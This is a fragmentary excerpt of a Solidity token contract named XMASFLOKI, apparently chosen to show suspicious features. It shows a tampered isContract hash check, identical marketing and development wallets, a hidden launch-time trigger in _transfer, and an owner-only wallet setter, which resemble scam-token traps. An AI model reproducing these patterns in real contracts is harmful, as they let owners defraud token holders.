...
library Address {
    ...
    function isContract(address account) internal view returns (bool) {
        ...
        bytes32 codehash;
        bytes32 accountHash = 0;  //hash address of empty contract
...
contract XMASFLOKI is Context, IERC20, Ownable {
    ...
    string private _symbol = "X-MASFLOKI";
    uint8 private _decimals = 4;

    address public marketingWallet = 0x0F82007FA6DC24Aee370eA6fd5fd7cc1E9Af640d;
    address public developmentWallet = 0x0F82007FA6DC24Aee370eA6fd5fd7cc1E9Af640d;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if((block.timestamp > launchTime + 1 minutes) && !triggered && (launchTime != 0) ){
    ...
    function setWallets(address _market,address _development,address _liquidityRec) public onlyOwner {
